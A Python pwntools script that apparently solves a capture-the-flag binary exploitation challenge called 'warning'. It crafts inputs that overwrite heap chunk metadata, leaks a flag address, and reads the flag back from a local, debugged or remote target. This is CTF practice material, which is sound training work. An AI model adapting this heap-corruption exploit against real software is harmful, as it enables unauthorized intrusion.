#!/usr/bin/env python3

from pwn import *
import argparse as ap

context.log_level = 'debug'

BINARY_PATH="../static/build"
BINARY_NAME="warning"

class Interface():
    def __init__(self, io):
        io.timeout = 10
        io.recvuntil(b"> ")

        self.io = io

    def send_msg(self, msg: str, newline=True) -> None:
        msg = msg if isinstance(msg,bytes) else msg.encode()
        if newline:
            self.io.sendline(msg)
        else:
            self.io.send(msg)

        return self.io.recv(2048, timeout=1)

    def interactive(self):
        self.io.interactive()

def make_string(a,b,c,sz):
    a = p32(a)
    b = p32(b)
    c = p32(c)

    msg = a+b+c
    return msg + b"\x00" * (sz-len(msg))
    # return msg + cyclic(sz-len(msg))

def main(proc_io):
    # context.log_level = logging.DEBUG
    io = Interface(proc_io)

    # a doesnt matter. b+c = 4091
    msg = make_string(0, 4090, 1, 0x410)
    response = io.send_msg(msg)

    response = io.send_msg(b"C"*0x10C + p64(0x121) + b"\x00")
    
    response = response.split(b"\n")[-2]
    flag_addr = int(response[response.index(b" "):],16)

    msg = b"A"

    io.send_msg(cyclic(40) + p64(flag_addr) + cyclic(1024-16-40-1))

    io.send_msg(b"A" * 63, newline=False)
    io.send_msg(b"B" * 63, newline=False)
    io.send_msg(b"C" * 63, newline=False)
    io.send_msg(b"D" * 22, newline=True)
    response = io.send_msg(b"E" * 21, newline=True).decode()

    flag = response[response.index("flag{"):]
    print(f"Got flag: {flag}")

if __name__ == "__main__":
    parser = ap.ArgumentParser()
    parser.add_argument('--hostname')
    parser.add_argument('--port')
    parser.add_argument('--debug', '-d', action='store_true')

    run_type = parser.add_mutually_exclusive_group()

    run_type.add_argument('--GDB', action='store_true')
    run_type.add_argument('--LOCAL', action='store_true')
    args = parser.parse_args()

    if args.debug:
        context.log_level = 'debug'

    proc_io = None

    gs = """
    set max-visualize-chunk-size 0x500
    continue
    """

    if args.GDB:
        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        proc_io = gdb.debug(elf.path, gdbscript=gs)
    elif args.LOCAL:
        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        print(os.getcwd())
        print(elf, elf.path)
        proc_io = process(elf.path)
    else:
        if not args.hostname or not args.port:
            parser.print_usage()
            print("error: the following arguments are required: --hostname, --port")
            exit(-1)

        # get ticket from environment
        ticket = os.getenv("TICKET")

        proc_io = remote(args.hostname, args.port )

        if ticket is not None:
            # Do a ticket submission
            proc_io.recvuntil(b"Ticket please:")
            proc_io.sendline(bytes(ticket, 'utf-8'))


    main(proc_io)
